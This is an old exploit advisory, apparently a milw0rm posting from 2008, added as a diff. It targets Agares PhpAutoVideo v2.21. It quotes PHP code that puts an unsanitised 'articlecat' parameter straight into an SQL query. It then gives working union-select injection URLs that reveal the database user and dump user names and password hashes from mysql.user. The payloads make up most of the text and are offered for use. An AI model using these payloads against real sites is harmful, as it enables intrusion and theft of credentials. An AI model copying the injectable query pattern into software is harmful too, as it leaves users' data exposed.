@@ -1,0 +1,26 @@
+-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-
+Agares PhpAutoVideo v2.21 Remote SQL Injection Vulnerability
+-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-
+
+D.O.M TEAM 2008
+we are: ka0x, an0de, xarnuz
+bug found by ka0x
+concat: ka0x01[at]gmail.com>
+#from spain
+
+vulnerability in /includes/articleblock.php
+
+vuln code:
+------------------------------------------------------------------
+$cat = $_GET['articlecat'];
+if ($cat == NULL){ $sql = "SELECT * FROM amcms_articles;"; }
+else{ $sql = "SELECT * FROM amcms_articles WHERE catid=$cat;"; }
+------------------------------------------------------------------
+
+Your user needs to be root@localhost or administrator mysql, check:
+http://[host]/includes/articleblock.php?articlecat=-1/**/union/**/select/**/user()/*
+
+user and password from mysql.user:
+http://[host]/phpautovideo/includes/articleblock.php?articlecat=-1/**/union/**/select/**/concat(user,0x203a3a20,password)/**/from/**/mysql.user/*
+
+# milw0rm.com [2008-01-12]
